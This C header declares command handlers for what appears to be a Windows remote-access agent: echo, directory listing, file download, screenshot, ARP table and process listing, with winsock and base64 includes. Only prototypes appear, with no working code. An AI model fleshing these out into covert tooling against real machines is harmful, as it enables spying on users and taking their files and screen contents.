#ifndef COMMAND
#define COMMAND
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <sys/stat.h>
#include <winsock2.h>
#include <windows.h>
#include <tchar.h>
#include <Psapi.h>
#include <iphlpapi.h>
#include "base64.hpp"


char *commandEcho(char *args, int argsLen, int *msgLen);
char *command_ls(char *args, int argsLen, int *msgLen);
char *command_download(char *args, int argsLen, int *msgLen);
char *command_screenshot(char *args, int argsLen, int *msgLen);
char *command_arp(char *args, int argsLen, int *msgLen);
char *command_process(char *args, int argsLen, int *msgLen);
#endif
